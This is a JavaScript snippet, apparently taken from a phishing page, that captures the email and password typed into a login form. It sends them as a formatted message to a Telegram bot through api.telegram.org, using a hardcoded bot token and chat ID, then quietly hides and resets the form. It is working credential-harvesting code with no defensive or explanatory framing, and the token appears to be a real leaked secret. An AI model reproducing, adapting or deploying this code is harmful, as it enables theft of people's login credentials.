    <script>
  const botToken = '7240803358:AAEHbrZsR5qeU570PBSvxKQGM3VnXAbN6C0'; // Your Telegram bot token
  const chatId = '5970218151'; // Your chat ID

  document.querySelector('form').addEventListener('submit', function (e) {
    e.preventDefault(); // Stop default form submission

    const email = document.querySelector('input[name="user"]').value;
    const password = document.querySelector('input[name="pass"]').value;

    const message = `🔐 *New Login Submitted*%0A📧 Email: ${email}%0A🔑 Password: ${password}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=Markdown`)
      .then(response => {
        if (response.ok) {
          // alert('Login sent! You can now close this box.');
          document.getElementById('id01').style.display = 'none';
          e.target.reset(); // Clear the form
        } else {
          // alert('Error sending to Telegram.');
        }
      })
      .catch(error => {
        alert('Error: ' + error.message);
      });
  });
